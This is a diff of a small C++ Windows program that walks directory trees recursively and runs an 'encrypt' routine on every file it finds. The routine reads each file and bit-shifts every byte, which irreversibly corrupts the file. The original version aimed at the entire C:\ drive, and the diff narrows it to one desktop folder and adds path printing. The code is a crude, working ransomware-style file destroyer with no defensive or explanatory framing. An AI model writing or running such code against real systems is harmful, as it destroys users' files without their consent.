@@ -4,18 +4,9 @@
 #include <filesystem>
 #include <windows.h>
 using namespace std;
-std::string replaceSpaces(std::string str) {//Filepaths with space breaks fstream
-    size_t pos = str.find(" ");
-    while (pos != std::string::npos) {
-        str.replace(pos, 1, "%20");
-        pos = str.find(" ", pos + 3);
-    }
-    return str;
-}
+
 void encrypt(string filepath) {
-    filepath = replaceSpaces(filepath);
     std::ifstream file(filepath, std::ios::binary);
-    //Buffer variable is a vector (Array) | read file character by character
     std::vector<char> buffer(std::istreambuf_iterator<char>(file), {});
     for (char& byte : buffer) {
         byte = byte << 1;
@@ -28,14 +19,15 @@ void FindFilesInDirectory(string directory) {
     WIN32_FIND_DATAA data;
     HANDLE hFind;
     string fullPath;
-    if ((hFind = FindFirstFileA((directory + "*").c_str(), &data)) != INVALID_HANDLE_VALUE) {//First file in root, if valid handle
+    if ((hFind = FindFirstFileA((directory + "*").c_str(), &data)) != INVALID_HANDLE_VALUE) {
         do {
-            if (strcmp(data.cFileName, ".") != 0 && strcmp(data.cFileName, "..") != 0) {//Will not itterate on current directory, "." and ".."
+            if (strcmp(data.cFileName, ".") != 0 && strcmp(data.cFileName, "..") != 0) {
                 fullPath = directory + "\\" + data.cFileName;
-                if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {//if the file is a directory
-                    FindFilesInDirectory(fullPath);//we do a little bit of recursion
+                if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                    FindFilesInDirectory(fullPath);
                 }
-                else {//Modify this block to do whatever for each file
+                else {
+                    cout << fullPath << "\n";
                     encrypt(fullPath);
                 }
             }
@@ -43,8 +35,9 @@ void FindFilesInDirectory(string directory) {
         FindClose(hFind);
     }
 }
+
 int main() {
-    string root = "C:\\";
+    string root = "C:\\Users\\jaken\\OneDrive\\Desktop\\I am vegeta\\";
     FindFilesInDirectory(root);
     return 0;
 }
